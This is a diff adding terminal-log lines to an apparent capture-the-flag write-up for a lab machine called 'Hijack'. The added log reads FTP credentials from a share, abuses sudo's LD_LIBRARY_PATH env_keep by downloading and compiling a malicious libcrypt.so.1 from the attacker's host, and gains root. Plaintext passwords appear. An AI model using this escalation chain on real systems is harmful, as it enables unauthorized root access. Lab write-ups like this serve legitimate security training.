@@ -256,7 +256,56 @@ www-data@Hijack:/tmp$ su rick
 su rick
 Password: N3v3rG0nn4G1v3Y0uUp
 
+rick@Hijack:/tmp$ cat ..//mnt/share/for_employees.txt
+cat ..//mnt/share/for_employees.txt
+ftp creds :
+
+ftpuser:W3stV1rg1n14M0un741nM4m4
+
+
+rick@Hijack:/tmp$ sudo -l
+[sudo] password for rick: 
+Matching Defaults entries for rick on Hijack:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    env_keep+=LD_LIBRARY_PATH
+
+User rick may run the following commands on Hijack:
+    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+
+
 rick@Hijack:/tmp$ 
+
+rick@Hijack:/tmp$ wget http://10.9.30.202/priv_esc_env_keep_2.c
+--2024-05-28 12:01:05--  http://10.9.30.202/priv_esc_env_keep_2.c
+Connecting to 10.9.30.202:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 214 [text/x-csrc]
+Saving to: ‘priv_esc_env_keep_2.c’
+
+priv_esc_env_keep_2.c        100%[==============================================>]     214  --.-KB/s    in 0s      
+
+2024-05-28 12:01:05 (39.4 MB/s) - ‘priv_esc_env_keep_2.c’ saved [214/214]
+
+rick@Hijack:/tmp$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /
+bin/            home/           lib64/          opt/            sbin/           tmp/            vmlinuz.old
+boot/           initrd.img      lost+found/     proc/           snap/           usr/            
+dev/            initrd.img.old  media/          root/           srv/            var/            
+etc/            lib/            mnt/            run/            sys/            vmlinuz         
+rick@Hijack:/tmp$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC ./
+.font-unix/            linpeas.sh             .Test-unix/            tmux-33/               .XIM-unix/
+.ICE-unix/             priv_esc_env_keep_2.c  tmux-1003/             .X11-unix/             
+rick@Hijack:/tmp$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC ./priv_esc_env_keep_2.c 
+./priv_esc_env_keep_2.c: In function ‘hijack’:
+./priv_esc_env_keep_2.c:8:9: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
+         setresuid(0,0,0);
+         ^
+rick@Hijack:/tmp$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+/usr/sbin/apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)
+root@Hijack:/tmp# cat /root/
+.bash_history   .bashrc         .mysql_history  .profile        root.txt        .ssh/           
+root@Hijack:/tmp# cat /root/root.txt 
+
 
 
 <\code>
